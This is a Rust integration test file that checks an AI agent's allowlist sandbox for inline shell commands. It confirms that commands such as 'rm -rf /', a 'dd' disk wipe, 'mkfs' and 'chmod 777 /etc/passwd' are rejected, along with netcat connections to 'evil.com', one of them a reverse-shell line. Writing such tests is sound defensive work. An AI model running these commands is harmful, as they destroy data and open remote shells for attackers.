//! Integration tests for dynamic context command sandboxing.
//!
//! Verifies that destructive, disallowed, and obfuscated commands are rejected
//! by the allowlist-based execution model in `inject_dynamic_context`.

use ragent_core::skill::context::inject_dynamic_context;
use std::path::Path;

fn wd() -> &'static Path {
    Path::new(env!("CARGO_MANIFEST_DIR"))
}

// ── Destructive commands are rejected ────────────────────────────

#[tokio::test]
async fn test_sandbox_rejects_rm_rf() {
    let result = inject_dynamic_context("Out: !`rm -rf /`", wd()).await.unwrap();
    assert!(
        result.contains("[command rejected:"),
        "rm should be rejected (not on allowlist): {result}"
    );
}

#[tokio::test]
async fn test_sandbox_rejects_dd() {
    let result = inject_dynamic_context("Out: !`dd if=/dev/zero of=/dev/sda`", wd())
        .await
        .unwrap();
    assert!(
        result.contains("[command rejected:"),
        "dd should be rejected (not on allowlist): {result}"
    );
}

#[tokio::test]
async fn test_sandbox_rejects_mkfs() {
    let result = inject_dynamic_context("Out: !`mkfs.ext4 /dev/sda1`", wd())
        .await
        .unwrap();
    assert!(
        result.contains("[command rejected:"),
        "mkfs should be rejected (not on allowlist): {result}"
    );
}

#[tokio::test]
async fn test_sandbox_rejects_chmod() {
    let result = inject_dynamic_context("Out: !`chmod 777 /etc/passwd`", wd())
        .await
        .unwrap();
    assert!(
        result.contains("[command rejected:"),
        "chmod should be rejected (not on allowlist): {result}"
    );
}

#[tokio::test]
async fn test_sandbox_rejects_chown() {
    let result = inject_dynamic_context("Out: !`chown root:root /tmp`", wd())
        .await
        .unwrap();
    assert!(
        result.contains("[command rejected:"),
        "chown should be rejected (not on allowlist): {result}"
    );
}

#[tokio::test]
async fn test_sandbox_rejects_nc() {
    let result = inject_dynamic_context("Out: !`nc evil.com 4444`", wd())
        .await
        .unwrap();
    assert!(
        result.contains("[command rejected:"),
        "nc should be rejected (not on allowlist): {result}"
    );
}

#[tokio::test]
async fn test_sandbox_rejects_ncat() {
    let result = inject_dynamic_context("Out: !`ncat -e /bin/bash evil.com 4444`", wd())
        .await
        .unwrap();
    assert!(
        result.contains("[command rejected:"),
        "ncat should be rejected (not on allowlist): {result}"
    );
}

#[tokio::test]
async fn test_sandbox_rejects_bash_directly() {
    let result = inject_dynamic_context("Out: !`bash -c 'echo hacked'`", wd())
        .await
        .unwrap();
    assert!(
        result.contains("[command rejected:"),
        "bash should be rejected (not on allowlist): {result}"
    );
}

#[tokio::test]
async fn test_sandbox_rejects_sh_directly() {
    let result = inject_dynamic_context("Out: !`sh -c 'echo hacked'`", wd())
        .await
        .unwrap();
    assert!(
        result.contains("[command rejected:"),
        "sh should be rejected (not on allowlist): {result}"
    );
}

// ── Allowed commands work ────────────────────────────────────────

#[tokio::test]
async fn test_sandbox_allows_echo() {
    let result = inject_dynamic_context("Out: !`echo sandbox_ok`", wd())
        .await
        .unwrap();
    assert!(
        result.contains("sandbox_ok"),
        "echo should be allowed and produce output: {result}"
    );
}

#[tokio::test]
async fn test_sandbox_allows_git() {
    let result = inject_dynamic_context("Out: !`git --version`", wd())
        .await
        .unwrap();
    assert!(
        result.contains("git version"),
        "git should be allowed: {result}"
    );
}

#[tokio::test]
async fn test_sandbox_allows_cat() {
    let result = inject_dynamic_context("Out: !`cat Cargo.toml`", wd())
        .await
        .unwrap();
    assert!(
        result.contains("[package]") || result.contains("ragent"),
        "cat should be allowed and read file: {result}"
    );
}

#[tokio::test]
async fn test_sandbox_allows_pipeline_with_allowed_first_cmd() {
    let result = inject_dynamic_context("Out: !`echo aaa bbb ccc | wc -w`", wd())
        .await
        .unwrap();
    assert!(
        result.contains("3"),
        "Pipeline with allowed first command should work: {result}"
    );
}

// ── Edge cases ───────────────────────────────────────────────────

#[tokio::test]
async fn test_sandbox_empty_command_handled() {
    let result = inject_dynamic_context("Out: !``", wd()).await.unwrap();
    // Empty backtick patterns are ignored (no command to run)
    assert!(
        result.contains("Out:"),
        "Empty command should be handled gracefully: {result}"
    );
}

#[tokio::test]
async fn test_sandbox_multiple_commands_mixed() {
    let result = inject_dynamic_context(
        "A: !`echo allowed` B: !`rm -rf /` C: !`echo also_ok`",
        wd(),
    )
    .await
    .unwrap();
    assert!(result.contains("allowed"), "First echo should succeed: {result}");
    assert!(
        result.contains("[command rejected:"),
        "rm should be rejected: {result}"
    );
    assert!(result.contains("also_ok"), "Second echo should succeed: {result}");
}

#[tokio::test]
async fn test_sandbox_command_with_path_prefix() {
    // /usr/bin/cat should extract "cat" and allow it
    let result = inject_dynamic_context("Out: !`/usr/bin/echo path_test`", wd())
        .await
        .unwrap();
    assert!(
        result.contains("path_test"),
        "/usr/bin/echo should be allowed via basename extraction: {result}"
    );
}
